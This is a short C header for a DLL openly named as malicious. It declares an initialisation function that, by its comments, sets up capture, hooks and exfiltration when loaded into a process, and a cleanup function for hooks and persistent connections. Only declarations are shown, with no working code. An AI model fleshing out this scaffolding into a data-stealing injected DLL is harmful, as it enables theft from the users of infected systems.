#ifndef MALICIOUS_DLL_H
#define MALICIOUS_DLL_H
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

// Called during process attach to initialize capture, hooks, and exfiltration.
BOOL InitializeMaliciousDLL();

// Called during process detach to clean up hooks and persistent connections.
VOID CleanupMaliciousDLL();

#endif // MALICIOUS_DLL_H
